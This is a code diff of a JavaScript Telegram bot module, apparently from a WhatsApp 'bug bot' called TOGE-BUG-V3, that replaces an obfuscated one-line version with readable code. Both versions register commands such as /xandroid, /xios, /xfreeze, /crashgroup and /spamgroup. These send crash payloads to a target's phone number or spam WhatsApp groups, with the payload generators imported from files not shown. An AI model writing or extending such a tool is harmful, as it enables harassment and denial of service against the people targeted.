@@ -1,1 +1,41 @@
-const _0x37177e=_0x4ec1;function _0x1db1(){const _0x2e2e28=['setupCommands','2mQjeVw','570199kEykOh','pair','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20*salut\x20!\x20je\x20suis\x20TOGE-BUG-V3\x20un\x20bug\x20bot\x20WhatsApp\x20développer\x20par*\x20@lionelmelo\x0a📱\x20*COMMANDES*\x0a\x0a🔗\x20Appairage\x20:\x20\x0a/paircode\x20[numéro]\x20*Ex:\x20/paircode\x2024105114159*\x0a\x0a💣\x20Commandes\x20Spéciales\x20:\x0a/xandroid\x20[cible]\x20-\x20Crash\x20Android\x0a/xios\x20[cible]\x20-\x20Crash\x20iOS\x0a/xfreeze\x20[cible]\x20-\x20Gel\x20WhatsApp\x0a/xbugv1\x20[cible]\x20-\x20Bug\x20v1\x0a/xbugv2\x20[cible]\x20-\x20Bug\x20v2\x0a\x0a💥\x20Commandes\x20Groupes\x20:\x0a/crashgroup\x20[lien]\x20-\x20Faire\x20planter\x20un\x20groupe\x0a/spamgroup\x20[lien]\x20-\x20Spammer\x20un\x20groupe\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','client','crashgroup','menu','spamGroup','reply','crashGroup','🔑\x20Code\x20d\x27appairage\x20:\x20','6174150sivdHX','./payloads','❌\x20Format:\x20/crashgroup\x20[lien_du_groupe]','PREMIUM_CMDS','\x20envoyé\x20à\x20','message','495oGJfbc','toUpperCase','status','split','\x20+numéro','command','2524NtUPRl','☠️\x20','text','6047196AlSzCZ','❌\x20Erreur:\x20','23930kHOcDm','path/to/your/image.jpg','💥\x20Erreur:\x20','781459yUWsTk','1947lFDDTm','success','9791784iwjegO','spamgroup','❌\x20Format:\x20/paircode\x2024105114159'];_0x1db1=function(){return _0x2e2e28;};return _0x1db1();}(function(_0x38de5f,_0x5f5422){const _0x2af4c7=_0x4ec1,_0x24e181=_0x38de5f();while(!![]){try{const _0xd4baf2=parseInt(_0x2af4c7(0x9b))/0x1*(-parseInt(_0x2af4c7(0xa2))/0x2)+-parseInt(_0x2af4c7(0x9c))/0x3*(-parseInt(_0x2af4c7(0x93))/0x4)+parseInt(_0x2af4c7(0x87))/0x5+parseInt(_0x2af4c7(0x96))/0x6+-parseInt(_0x2af4c7(0xa3))/0x7+-parseInt(_0x2af4c7(0x9e))/0x8+parseInt(_0x2af4c7(0x8d))/0x9*(parseInt(_0x2af4c7(0x98))/0xa);if(_0xd4baf2===_0x5f5422)break;else _0x24e181['push'](_0x24e181['shift']());}catch(_0x381d42){_0x24e181['push'](_0x24e181['shift']());}}}(_0x1db1,0xaa26d));const {sendPayload}=require(_0x37177e(0x88));function _0x4ec1(_0x592331,_0x7543e8){const _0x1db14e=_0x1db1();return _0x4ec1=function(_0x4ec1a6,_0x5a0730){_0x4ec1a6=_0x4ec1a6-0x85;let _0x24bceb=_0x1db14e[_0x4ec1a6];return _0x24bceb;},_0x4ec1(_0x592331,_0x7543e8);}module['exports'][_0x37177e(0xa1)]=(_0x2380d1,_0x70c304,_0x28ddd2)=>{const _0x1693b5=_0x37177e;_0x2380d1[_0x1693b5(0x92)](_0x1693b5(0xa8),_0x17d7d9=>{const _0x2c3bab=_0x1693b5;_0x17d7d9['replyWithPhoto']({'source':_0x2c3bab(0x99)},{'caption':_0x2c3bab(0xa5),'parse_mode':'MarkdownV2'});}),_0x2380d1['command']('paircode',async _0x19ad7b=>{const _0x1478ee=_0x1693b5,_0xf9dd3f=_0x19ad7b['message']['text']['split']('\x20')[0x1];if(!_0xf9dd3f)return _0x19ad7b['reply'](_0x1478ee(0xa0));const _0x4fe131=await _0x70c304[_0x1478ee(0xa4)](_0xf9dd3f);_0x4fe131[_0x1478ee(0x8f)]===_0x1478ee(0x9d)?_0x19ad7b['reply'](_0x1478ee(0x86)+_0x4fe131['code']):_0x19ad7b['reply']('❌\x20Erreur:\x20'+_0x4fe131[_0x1478ee(0x8c)]);});const _0x274187=_0xfc7e7b=>async _0x232d35=>{const _0xbcd020=_0x1693b5,_0x31a5ab=_0x232d35[_0xbcd020(0x8c)][_0xbcd020(0x95)][_0xbcd020(0x90)]('\x20')[0x1];if(!_0x31a5ab)return _0x232d35['reply']('❌\x20Usage:\x20/'+_0xfc7e7b+_0xbcd020(0x91));try{await sendPayload(_0x70c304[_0xbcd020(0xa6)],_0x31a5ab,_0xfc7e7b[_0xbcd020(0x8e)]()),_0x232d35[_0xbcd020(0xaa)](_0xbcd020(0x94)+_0xfc7e7b+_0xbcd020(0x8b)+_0x31a5ab);}catch(_0x2ab9f4){_0x232d35[_0xbcd020(0xaa)](_0xbcd020(0x9a)+_0x2ab9f4[_0xbcd020(0x8c)]);}};_0x2380d1[_0x1693b5(0x92)](_0x1693b5(0xa7),async _0x164b04=>{const _0x15eb17=_0x1693b5,_0x585bda=_0x164b04[_0x15eb17(0x8c)]['text'][_0x15eb17(0x90)]('\x20')[0x1];if(!_0x585bda)return _0x164b04['reply'](_0x15eb17(0x89));try{await _0x70c304[_0x15eb17(0x85)](_0x585bda),_0x164b04[_0x15eb17(0xaa)]('💥\x20Le\x20groupe\x20a\x20été\x20crashé\x20:\x20'+_0x585bda);}catch(_0x375f40){_0x164b04['reply'](_0x15eb17(0x97)+_0x375f40['message']);}}),_0x2380d1[_0x1693b5(0x92)](_0x1693b5(0x9f),async _0x9eaa39=>{const _0x47c06b=_0x1693b5,_0x12f774=_0x9eaa39['message'][_0x47c06b(0x95)][_0x47c06b(0x90)]('\x20')[0x1];if(!_0x12f774)return _0x9eaa39[_0x47c06b(0xaa)]('❌\x20Format:\x20/spamgroup\x20[lien_du_groupe]');try{await _0x70c304[_0x47c06b(0xa9)](_0x12f774),_0x9eaa39[_0x47c06b(0xaa)]('📢\x20Spam\x20envoyé\x20dans\x20le\x20groupe\x20:\x20'+_0x12f774);}catch(_0x547fdd){_0x9eaa39[_0x47c06b(0xaa)](_0x47c06b(0x97)+_0x547fdd[_0x47c06b(0x8c)]);}}),_0x28ddd2[_0x1693b5(0x8a)]['forEach'](_0x2ec1a6=>_0x2380d1[_0x1693b5(0x92)](_0x2ec1a6,_0x274187(_0x2ec1a6)));};
+const { BOT, PREMIUM_CMDS, ERROR_MESSAGES, SUCCESS_MESSAGES } = require('./config');
+const { generateAndroidPayload, generateIOSPayload } = require('./payload');
+
+module.exports = (bot) => {
+    // Commande /menu
+    bot.command('menu', (ctx) => {
+        const menu = `
+        🚀 *Commandes Disponibles* :
+        /paircode [num] - Générer un code d'appairage
+        /xandroid [num] - Crash Android
+        /xios [num] - Crash iOS
+        /crashgroup [lien] - Crash un groupe
+        `;
+        ctx.replyWithMarkdown(menu);
+    });
+
+    // Commande /paircode
+    bot.command('paircode', (ctx) => {
+        const [cmd, number] = ctx.message.text.split(' ');
+        if (!number) return ctx.reply(ERROR_MESSAGES.INVALID_NUMBER);
+        
+        const code = Math.floor(1000 + Math.random() * 9000);
+        ctx.reply(`${SUCCESS_MESSAGES.PAIR_CODE_SENT}\nCode : ||${code}||`, { parse_mode: 'Markdown' });
+    });
+
+    // Commande premium (/xandroid, /xios)
+    PREMIUM_CMDS.forEach(cmd => {
+        bot.command(cmd, (ctx) => {
+            if (ctx.from.id.toString() !== BOT.OWNER_ID) {
+                return ctx.reply(ERROR_MESSAGES.PERMISSION_DENIED);
+            }
+            
+            const [_, target] = ctx.message.text.split(' ');
+            const payload = cmd === 'xandroid' 
+                ? generateAndroidPayload(target) 
+                : generateIOSPayload(target);
+            
+            ctx.replyWithMarkdown(SUCCESS_MESSAGES.CRASH_SENT);
+        });
+    });
+};
